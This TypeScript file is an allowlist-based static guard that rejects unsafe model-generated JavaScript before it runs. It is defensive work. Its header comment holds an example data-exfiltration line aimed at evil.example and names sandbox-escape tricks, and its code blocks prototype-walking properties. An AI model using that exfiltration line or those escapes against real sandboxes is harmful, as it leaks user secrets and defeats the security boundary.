/**
 * guard.ts – static security check for model-generated JavaScript.
 *
 * ── Threat model ─────────────────────────────────────────────────────────────
 *
 * The model writes JavaScript that we execute in the browser against the host
 * app's API object. The code runs inside `with (api) { ... }`, which makes the
 * API functions look like globals. `with` is ergonomics, never security: any
 * identifier the API object does *not* define still falls through to the real
 * global scope.
 *
 * So the guard – not the sandbox – is the security boundary. It rejects code
 * before a single statement runs.
 *
 * ── Why an allowlist ─────────────────────────────────────────────────────────
 *
 * A blocklist of dangerous names (window, fetch, document, …) is easy to write
 * and impossible to finish: every global you forget is an open door. `new
 * Image().src = "https://evil.example/?" + secret` exfiltrates data without
 * touching a single blocklisted name.
 *
 * This guard inverts it. It resolves every identifier against the lexical
 * scopes the code itself declares, then against the host API's own keys, then
 * against a small allowlist of pure built-ins (Math, JSON, Object, …). Anything
 * still unresolved is a free reference to an unknown global – and is rejected.
 * Unknown globals fail closed.
 *
 * On top of that it blocks the classic sandbox escapes that use only allowed
 * names: `this` (→ globalThis in sloppy mode), `.constructor` (→ Function),
 * prototype walking, dynamic `import()`, and computed member access built from
 * expressions (`obj["constr" + "uctor"]`).
 *
 * ── What it does not do ──────────────────────────────────────────────────────
 *
 * It cannot stop a runaway loop: the code shares the browser's main thread by
 * design (it needs synchronous access to the app's state), so `while (true) {}`
 * hangs the tab. The executor's timeout only catches async hangs. Keep the API
 * surface free of destructive operations you would not let a user perform.
 */
import * as acorn from "acorn";

export interface GuardOptions {
  /**
   * Names the host API provides. These resolve because the code runs inside
   * `with (api)`. Pass `Object.keys(api)`.
   */
  apiNames?: string[];
  /** Additional globals to permit (e.g. a charting lib you deliberately expose). */
  extraGlobals?: string[];
  /** Max source length in characters (default 10000). */
  maxLength?: number;
  /** Max AST nodes, a cheap ceiling on complexity (default 2500). */
  maxNodes?: number;
}

export interface GuardResult {
  ok: boolean;
  /** Why the code was rejected. Written for the model – it is fed back verbatim. */
  reason?: string;
  /** Position in the original source (1-based line, 0-based column). */
  at?: { line: number; column: number };
}

/**
 * Built-ins the generated code may use. Pure computation and formatting only:
 * nothing here reaches the network, the DOM, storage, or the module system.
 */
const SAFE_GLOBALS = new Set([
  "Array", "ArrayBuffer", "BigInt", "Boolean", "Date", "Error", "Infinity",
  "Intl", "JSON", "Map", "Math", "NaN", "Number", "Object", "Promise",
  "RangeError", "RegExp", "Set", "String", "Symbol", "TypeError", "WeakMap",
  "WeakSet", "console", "decodeURIComponent", "encodeURIComponent", "isFinite",
  "isNaN", "parseFloat", "parseInt", "structuredClone", "undefined",
]);

/** Node types with no legitimate use here and a proven escape history. */
const BLOCKED_NODES: Record<string, string> = {
  ThisExpression: "`this` is not available – call the API functions directly.",
  ImportExpression: "Dynamic import() is not allowed.",
  MetaProperty: "`import.meta` / `new.target` are not allowed.",
  WithStatement: "`with` is not allowed.",
  TaggedTemplateExpression: "Tagged templates are not allowed – use plain strings.",
  DebuggerStatement: "`debugger` is not allowed.",
};

/**
 * Property names that walk from any value back to the Function constructor,
 * and from there to arbitrary code. Blocked in both `a.b` and `a["b"]` form.
 */
const BLOCKED_PROPERTIES = new Set([
  "constructor",
  "prototype",
  "__proto__",
  "getPrototypeOf",
  "setPrototypeOf",
  "defineProperty",
  "defineProperties",
  "getOwnPropertyDescriptor",
  "getOwnPropertyDescriptors",
  "__defineGetter__",
  "__defineSetter__",
  "__lookupGetter__",
  "__lookupSetter__",
]);

// The code is wrapped so that top-level `return` and `await` parse. Column
// numbers on line 1 are shifted by the wrapper and corrected on the way out.
const WRAPPER_PREFIX = "(async function __checked__() {\n";

/**
 * Checks model-generated code and reports whether it is safe to execute.
 * Never throws: a parse error is reported as a rejection, because that is a
 * message the model can act on.
 */
export function guardCode(source: string, options: GuardOptions = {}): GuardResult {
  const {
    apiNames = [],
    extraGlobals = [],
    maxLength = 10_000,
    maxNodes = 2500,
  } = options;

  if (typeof source !== "string") {
    return { ok: false, reason: "Code must be a string." };
  }
  if (source.length > maxLength) {
    return {
      ok: false,
      reason: `Code is too long (${source.length} characters, limit ${maxLength}). Split the work into several smaller calls.`,
    };
  }

  let ast: acorn.Node;
  try {
    // The wrapper starts on its own line, so only line 1 of the original is
    // ever offset – and the newline means it never is.
    ast = acorn.parse(WRAPPER_PREFIX + source + "\n})", {
      ecmaVersion: 2022,
      sourceType: "script",
      locations: true,
    });
  } catch (error: any) {
    return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
  }

  const allowed = new Set([...SAFE_GLOBALS, ...apiNames, ...extraGlobals]);
  const checker = new Checker(allowed, maxNodes);
  return checker.run(ast);
}

// ── Scope tracking ────────────────────────────────────────────────────────────

type Node = any;

class Scope {
  readonly names = new Set<string>();
  constructor(
    readonly parent: Scope | null,
    /** Function scopes absorb hoisted `var` and function declarations. */
    readonly isFunctionScope: boolean
  ) {}

  declare(name: string) {
    this.names.add(name);
  }

  has(name: string): boolean {
    for (let scope: Scope | null = this; scope; scope = scope.parent) {
      if (scope.names.has(name)) return true;
    }
    return false;
  }
}

class Checker {
  private nodeCount = 0;

  constructor(
    private readonly allowed: Set<string>,
    private readonly maxNodes: number
  ) {}

  run(ast: Node): GuardResult {
    try {
      // The wrapper function is the outermost scope; the guarded code is its body.
      this.visit(ast, null, new Scope(null, true));
      return { ok: true };
    } catch (violation) {
      if (violation instanceof Violation) {
        return { ok: false, reason: violation.reason, at: violation.at };
      }
      throw violation;
    }
  }

  private visit(node: Node, parent: Node, scope: Scope): void {
    if (!node || typeof node !== "object" || typeof node.type !== "string") return;

    if (++this.nodeCount > this.maxNodes) {
      throw new Violation(
        `Code is too complex (over ${this.maxNodes} syntax nodes). Keep it simple and split the work.`,
        node
      );
    }

    const blocked = BLOCKED_NODES[node.type];
    if (blocked) throw new Violation(blocked, node);

    if (node.type === "MemberExpression") this.checkMemberAccess(node);
    if (node.type === "Identifier") this.checkIdentifier(node, parent, scope);

    // Functions and blocks open a new scope; everything else stays in the
    // current one.
    if (isFunction(node)) {
      this.visitFunction(node, scope);
      return;
    }
    if (node.type === "BlockStatement" || isForStatement(node)) {
      const inner = new Scope(scope, false);
      this.hoistBlockDeclarations(node, inner);
      this.visitChildren(node, inner);
      return;
    }
    if (node.type === "CatchClause") {
      const inner = new Scope(scope, false);
      if (node.param) this.declarePattern(node.param, inner);
      this.visitChildren(node, inner);
      return;
    }

    this.visitChildren(node, scope);
  }

  private visitChildren(node: Node, scope: Scope): void {
    for (const key of Object.keys(node)) {
      if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
      const child = node[key];
      if (Array.isArray(child)) {
        for (const item of child) this.visit(item, node, scope);
      } else {
        this.visit(child, node, scope);
      }
    }
  }

  private visitFunction(node: Node, parentScope: Scope): void {
    const scope = new Scope(parentScope, true);
    // A named function expression can refer to itself.
    if (node.id?.name) scope.declare(node.id.name);
    for (const param of node.params ?? []) this.declarePattern(param, scope);

    if (node.body?.type === "BlockStatement") {
      this.hoistFunctionDeclarations(node.body, scope);
      this.hoistBlockDeclarations(node.body, scope);
      this.visitChildren(node.body, scope);
    } else {
      // Concise arrow body: `x => x * 2`
      this.visit(node.body, node, scope);
    }

    for (const param of node.params ?? []) this.visit(param, node, scope);
  }

  /**
   * Declares `let`, `const`, `class` and function declarations of one block
   * before its statements are visited, so mutual references inside the block
   * resolve regardless of order.
   */
  private hoistBlockDeclarations(block: Node, scope: Scope): void {
    const statements: Node[] = block.body ?? [];
    const list = Array.isArray(statements) ? statements : [statements];
    for (const statement of list) {
      if (!statement || typeof statement !== "object") continue;
      if (statement.type === "VariableDeclaration") {
        for (const declarator of statement.declarations) {
          this.declarePattern(declarator.id, scope);
        }
      } else if (
        statement.type === "FunctionDeclaration" ||
        statement.type === "ClassDeclaration"
      ) {
        if (statement.id?.name) scope.declare(statement.id.name);
      }
    }
    // `for (const item of list)` / `for (let i = 0; ...)` declare in the loop's own scope.
    if (block.left?.type === "VariableDeclaration") {
      for (const declarator of block.left.declarations) this.declarePattern(declarator.id, scope);
    }
    if (block.init?.type === "VariableDeclaration") {
      for (const declarator of block.init.declarations) this.declarePattern(declarator.id, scope);
    }
  }

  /**
   * Hoists `var` and function declarations from anywhere in a function body up
   * to the function scope – but never descends into nested functions, which
   * have their own.
   */
  private hoistFunctionDeclarations(node: Node, scope: Scope): void {
    if (!node || typeof node !== "object" || typeof node.type !== "string") return;
    if (isFunction(node)) return;

    if (node.type === "VariableDeclaration" && node.kind === "var") {
      for (const declarator of node.declarations) this.declarePattern(declarator.id, scope);
    }
    if (node.type === "FunctionDeclaration" && node.id?.name) {
      scope.declare(node.id.name);
    }

    for (const key of Object.keys(node)) {
      if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
      const child = node[key];
      if (Array.isArray(child)) {
        for (const item of child) this.hoistFunctionDeclarations(item, scope);
      } else {
        this.hoistFunctionDeclarations(child, scope);
      }
    }
  }

  /** Declares every binding a destructuring pattern introduces. */
  private declarePattern(pattern: Node, scope: Scope): void {
    if (!pattern || typeof pattern !== "object") return;
    switch (pattern.type) {
      case "Identifier":
        scope.declare(pattern.name);
        return;
      case "ObjectPattern":
        for (const property of pattern.properties) {
          this.declarePattern(property.type === "RestElement" ? property.argument : property.value, scope);
        }
        return;
      case "ArrayPattern":
        for (const element of pattern.elements) this.declarePattern(element, scope);
        return;
      case "AssignmentPattern":
        this.declarePattern(pattern.left, scope);
        return;
      case "RestElement":
        this.declarePattern(pattern.argument, scope);
        return;
    }
  }

  /**
   * The heart of the guard: an identifier used as a value must resolve to
   * something the code declared, to the host API, or to a safe built-in.
   */
  private checkIdentifier(node: Node, parent: Node, scope: Scope): void {
    if (!isReference(node, parent)) return;
    if (scope.has(node.name)) return;
    if (this.allowed.has(node.name)) return;

    throw new Violation(
      `"${node.name}" is not available. Use only the documented API functions, ` +
        `local variables, and standard built-ins such as Math, JSON or Object.`,
      node
    );
  }

  private checkMemberAccess(node: Node): void {
    if (!node.computed) {
      const name = node.property?.name;
      if (name && BLOCKED_PROPERTIES.has(name)) {
        throw new Violation(`Accessing .${name} is not allowed.`, node.property);
      }
      return;
    }

    const key = node.property;
    if (key?.type === "Literal") {
      if (typeof key.value === "number") return;
      if (typeof key.value === "string") {
        if (BLOCKED_PROPERTIES.has(key.value)) {
          throw new Violation(`Accessing ["${key.value}"] is not allowed.`, key);
        }
        return;
      }
    }
    if (key?.type === "Identifier") return; // items[i] – the identifier itself is checked separately

    // Anything computed from an expression could spell out a blocked property
    // at runtime: obj["constr" + "uctor"], obj[keys[j]], obj[f()].
    throw new Violation(
      "Computed property access must be a simple name, number or string literal " +
        "(items[i], items[0], obj[\"name\"]) – not an expression.",
      key ?? node
    );
  }
}

class Violation {
  readonly at?: { line: number; column: number };
  constructor(readonly reason: string, node: Node) {
    const start = node?.loc?.start;
    if (start) {
      // Line 1 of the wrapper is the wrapper itself, so the original code
      // starts on line 2 – shift back.
      this.at = { line: Math.max(1, start.line - 1), column: start.column };
    }
  }
}

// ── Node predicates ───────────────────────────────────────────────────────────

function isFunction(node: Node): boolean {
  return (
    node.type === "FunctionDeclaration" ||
    node.type === "FunctionExpression" ||
    node.type === "ArrowFunctionExpression"
  );
}

function isForStatement(node: Node): boolean {
  return (
    node.type === "ForStatement" ||
    node.type === "ForOfStatement" ||
    node.type === "ForInStatement"
  );
}

/**
 * True when an identifier is a *value reference* rather than a name in some
 * other position: `obj.key` (property), `{ key: 1 }` (object key), `label:`
 * (statement label). Those never resolve against a scope, so checking them
 * would produce false rejections.
 */
function isReference(node: Node, parent: Node): boolean {
  if (!parent) return true;

  switch (parent.type) {
    case "MemberExpression":
      return parent.computed || parent.property !== node;
    case "Property":
      // `{ shorthand }` is both key and value – still a reference.
      return parent.computed || parent.key !== node || parent.shorthand;
    case "MethodDefinition":
    case "PropertyDefinition":
      return parent.computed || parent.key !== node;
    case "LabeledStatement":
    case "BreakStatement":
    case "ContinueStatement":
      return parent.label !== node;
    default:
      return true;
  }
}
